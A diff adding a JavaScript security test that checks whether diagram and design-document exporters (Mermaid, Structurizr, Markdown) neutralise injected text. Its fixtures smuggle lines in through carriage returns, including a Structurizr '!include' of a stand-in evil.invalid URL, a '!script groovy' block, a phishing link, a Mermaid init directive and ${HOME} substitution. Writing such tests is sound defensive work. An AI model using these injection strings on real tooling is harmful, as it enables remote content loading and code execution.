@@ -117,6 +117,60 @@ test('Mermaid, Structurizr and design-document exports keep authored text as tex
   }
 });
 
+// Each consumer ends a line in its own way: CommonMark, Mermaid and Java's line reader (which
+// Structurizr uses) all end one at a lone CR. Structurizr knows one escape (\") and
+// substitutes ${NAME}; Mermaid reads %%{init}%% directives anywhere; a Markdown list item can
+// hold any block. The checks below read each export the way its consumer does.
+test('line breaks, backslashes, substitutions and directives in authored text stay text in every text export', () => {
+  const CR = '\r';
+  const document = hostileDocument({ child: false });
+  document.meta.title = `T${CR}!include https://evil.invalid/x.dsl${CR}//`;
+  document.components[0].label = `x${CR}Person(evil, Injected)`;
+  document.components[0].sublabel = 'ends in a backslash \\';
+  document.components[1].label = '${HOME} %%{init: {"theme":"dark"}}%%';
+  document.components[1].sublabel = 's\u2028# heading';
+  document.components[2].label = `y${CR}link app: Status @ https://evil.invalid/phish`;
+  document.connections[0].label = `quote \\" and \\${CR}!script groovy {`;
+  document.boundaries[0].label = `b${CR}~~~`;
+  document.cards[1].items = ['# heading', '---', '1. x', '+ x', '~~~ js', '    indented', `x${CR}# heading`];
+  document.workbench.adrs[0].context = `ctx${CR}~~~`;
+  document.workbench.traces[0].steps[0].note = `n${CR}Note over app: injected`;
+  const { model } = buildModel(document);
+  const lines = (text) => text.split(/\r\n|\r|\n/);
+  const mermaid = toMermaidMarkdown(model);
+  const structurizr = toStructurizr(model);
+  const rfc = toRfc(document, model);
+  for (const [name, text] of [['mermaid', mermaid], ['structurizr', structurizr], ['rfc', rfc]]) {
+    assert.equal(/[\r\u000b\u000c\u0085\u2028\u2029]/.test(text), false, `${name}: an authored line break survives`);
+  }
+
+  // Structurizr: no author-controlled line, every string closed under its one escape, no substitution.
+  for (const line of lines(structurizr)) {
+    assert.equal(/^\s*(!|\/\/|\/\*)/.test(line), false, `a directive or comment line: ${line.slice(0, 120)}`);
+    assert.equal(count(line.replace(/\\"/g, ''), '"') % 2, 0, `an open string under Structurizr's tokenizer: ${line.slice(0, 120)}`);
+  }
+  assert.equal(/\$\{[A-Za-z0-9_.-]+\}/.test(structurizr), false, 'a ${NAME} substitution');
+  // Braces outside quoted strings are the exporter's blocks; authored braces stay inside strings.
+  const structure = lines(structurizr).map((line) => line.replace(/\\"/g, '').replace(/"[^"]*"/g, '""')).join('\n');
+  assert.equal(count(structure, '{'), count(structure, '}'));
+  assert.ok(structurizr.includes('ends in a backslash \\\u2060"') && structurizr.includes('$\u2060{HOME}'), 'the authored text is still there, as text');
+
+  // Mermaid: no directive, no statement the exporter did not write.
+  assert.equal(mermaid.includes('%%{'), false, 'an init directive');
+  const rfcDiagram = rfc.match(/```mermaid\n([\s\S]*?)\n```/)[1];
+  assert.equal(rfcDiagram.includes('%%{'), false, 'an init directive in the design document\'s diagram');
+  for (const line of lines(mermaid)) assert.equal(/^\s*(link |Person\(evil|Note over app: injected)/.test(line), false, `an authored statement: ${line}`);
+
+  // Markdown: no authored block, and list items stay plain items.
+  for (const text of [rfc, mermaid]) {
+    for (const line of lines(text)) assert.equal(/^(\s*~~~|# heading|\s{4,}indented)/.test(line), false, `an authored block: ${line}`);
+  }
+  const items = rfc.slice(rfc.indexOf('Assumptions:')).split('\n\n')[1].split('\n');
+  assert.equal(items.length, 7);
+  for (const item of items) assert.match(item, /^- (?![#+~=-]|\d+[.)]|\s)/, `an authored block in a list item: ${item}`);
+  assert.equal(count(rfc, '```'), 2, 'one diagram block, opened and closed by the exporter');
+});
+
 test('the export command writes the same safe output', (t) => {
   const directory = fs.mkdtempSync(path.join(os.tmpdir(), 'archi-made-easy-security-export-'));
   t.after(() => fs.rmSync(directory, { recursive: true, force: true }));
